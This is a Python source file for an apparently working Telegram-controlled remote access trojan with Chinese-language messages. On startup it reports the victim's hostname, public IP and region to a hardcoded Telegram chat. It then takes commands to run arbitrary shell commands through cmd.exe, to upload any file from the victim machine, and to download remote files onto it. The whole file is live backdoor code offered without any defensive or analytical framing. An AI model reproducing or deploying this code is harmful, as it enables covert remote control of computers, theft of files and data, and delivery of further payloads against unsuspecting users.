import telebot
import string
import requests
from telebot import *
import hashlib
import re
import random
import os

apihelper.proxy = {'http':'http://127.0.0.1:25378'}
token='YOUR TOKEN'
bot=telebot.TeleBot(token,threaded=False)
url='http://ip.taobao.com/service/getIpInfo.php?ip=myip'

LD=[]
IPS=[]


lk = []
id = ''
key = string.ascii_lowercase
for g in key:
    lk.append(g)
for k in range(32):
    id += random.choice(lk)

md5 = hashlib.md5()
md5.update(id.encode('gb2312'))
LD.append(md5.hexdigest())

rqt=requests.get(url=url)
try:
    js=rqt.json()['data']
    IPS.append('IP:{} country:{} region:{}'.format(js['ip'],js['country'],js['region']))
except:
    pass
    IPS.append('IP:False country:False region:False')

hostname = os.popen('hostname').read()

bot.send_message(631202355,"你有新的主机上线 name:{} ID:{} {}".format(str(hostname).lstrip().rstrip().replace('\n',''),LD[0],IPS[0]))
@bot.message_handler(commands=['help'])
def send_welcome(message):
    bot.reply_to(message,'/cmd [token] [command] -- 执行cmd命令\n/computer -- 查看主机信息\n/upload [token] [filepath] -- 上传机器的文件到tg\n/download [token] [fileptah] -- 下载远程文件到目标机器\n/help [token] -- 帮助信息')

@bot.message_handler(commands=['computer'])
def commputer(message):
    bot.reply_to(message,'主机信息:')
    jg='name:{} ID:{} {}'.format(str(hostname).lstrip().rstrip().replace('\n',''),LD[0],IPS[0])
    bot.reply_to(message,jg)

@bot.message_handler(regexp="[/]cmd [0-9-a-z]{32} .*")
def handle_message(message):
    command=str(message.text).replace('/cmd','').strip().lstrip()
    ken=re.findall('[0-9-a-z]{32}',command)
    if ken[0]==LD[0]:
        commands=re.subn("[0-9-a-z]{32}","",command)
        cmd=str(commands[0]).lstrip().rstrip()
        jg=os.popen('cmd.exe /c {}'.format(cmd)).read()
        splitted_text=util.split_string(jg,3000)
        for text in splitted_text:
            bot.reply_to(message,text)

@bot.message_handler(regexp="[/]upload [0-9-a-z]{32} .*")
def upload(message):
    command=str(message.text).replace('/upload','').strip().lstrip()
    ken=re.findall('[0-9-a-z]{32}',command)
    if ken[0]==LD[0]:
        commands=re.subn("[0-9-a-z]{32}","",command)
        path=str(commands[0]).lstrip().rstrip()
        file_name=str(path).split('\\')[-1]
        try:
            file=open(path,'rb')
            bot.send_document(631202355,file,caption=file_name)
        except:
            pass
            bot.send_message(631202355,'没有:{}这个文件'.format(path))

@bot.message_handler(regexp="[/]download [0-9-a-z]{32} .*")
def download(message):
  command = str(message.text).replace('/download', '').strip().lstrip()
  ken = re.findall('[0-9-a-z]{32}', command)
  if ken[0] == LD[0]:
    url=re.subn("[0-9-a-z]{32}", "", command)
    try:
        file_name=str(url[0].split('/')[-1])
        dk=open(file_name,'wb')
        rqt=requests.get(url=str(url[0]).lstrip().rstrip(),headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'},timeout=30)
        print(rqt.status_code)
        dk.write(rqt.content)
        dk.close()
        if os.path.exists(file_name):
            bot.send_message(631202355,'文件:{} download 成功!'.format(file_name))
        else:
            bot.send_message(631202355, '文件:{} download 失败!'.format(file_name))
    except Exception as r:
        bot.send_message(631202355,'Error:{}'.format(r))

bot.polling()